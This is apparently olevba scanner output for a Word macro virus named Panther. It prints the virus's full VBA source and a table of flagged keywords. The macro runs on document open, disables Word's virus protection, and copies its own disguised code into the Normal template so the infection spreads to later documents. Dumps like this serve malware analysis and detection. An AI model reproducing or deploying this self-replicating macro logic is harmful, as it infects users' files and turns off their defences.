olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Panther.o
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Panther.o - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()

End Sub

Private Sub Document_Open()
    Dim code As String
    If Left$(NormalTemplate.Name, 8) <> "Document" Then
        Options.VirusProtection = False
        With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
            code = .Lines(1, .CountOfLines)
            ReplaceTemplate code, "Normal", "Template", "Happy", "Panther"
            ReplaceTemplate code, "Active", "Document", "Normal", "Template"
            ReplaceTemplate code, "Happy", "Panther", "Active", "Document"
            With NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
                .DeleteLines 1, .CountOfLines
                .AddFromString code
            End With
        End With
        Options.SaveNormalPrompt = False
        If InStr("NormalTemplate", "Document") > 0 Then NormalTemplate.Save
        End If
    
    
End Sub
Private Sub ReplaceTemplate(target As String, prepre As String, prepost As String, postpre As String, postpost As String)
    Dim index As Long, pre As String, post As String, preLen As Long
    
    pre = prepre + prepost
    post = postpre + postpost
    
    index = 1
    preLen = Len(pre)
    
    While InStr(index, target, pre) <> 0
        index = InStr(index, target, pre)
        target = Left(target, index - 1) + post + Mid$(target, index + preLen)
        index = index + 1
    Wend
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

